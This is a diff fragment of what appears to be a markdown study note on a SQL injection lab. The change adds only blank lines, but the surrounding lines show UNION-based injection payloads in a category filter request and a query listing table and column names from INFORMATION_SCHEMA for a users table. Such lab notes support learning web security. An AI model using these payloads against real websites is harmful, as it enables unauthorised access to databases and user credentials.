@@ -69,6 +69,8 @@ GET /filter?category=Gifts' UNION SELECT 'afsd','acvd'-- HTTP/1.1
 ```
 ' UNION SELECT TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users_evhifo'-- -
 ```
+
+
 ![[Pasted image 20251212204012.png]]
 
 **Note the column names:**
